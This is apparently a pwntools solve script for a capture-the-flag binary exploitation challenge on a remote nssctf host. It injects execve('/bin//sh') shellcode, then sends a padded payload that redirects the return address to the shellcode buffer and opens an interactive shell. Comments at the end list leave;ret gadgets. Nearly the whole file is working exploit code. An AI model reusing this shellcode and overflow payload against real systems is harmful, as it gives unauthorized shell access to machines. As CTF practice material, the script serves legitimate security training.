from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])


# io=process("./pwn1")
io=remote("node5.anna.nssctf.cn",28533)
leave_ret=0x40074e
ex_addr=0x6010A0
shellcode=b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
# shellcode=asm(shellcraft.sh())
io.recvuntil(b"Please.\n")

# gdb.attach(io)
# pause()

io.send(shellcode)
io.recvuntil(b"Let's start!\n")
payload=cyclic(0x12)+p64(ex_addr)
io.send(payload)
io.interactive()


# Gadgets information
# ============================================================
# 0x000000000040074e : leave ; ret
# 0x000000000040028e : ret

# Unique gadgets found: 2
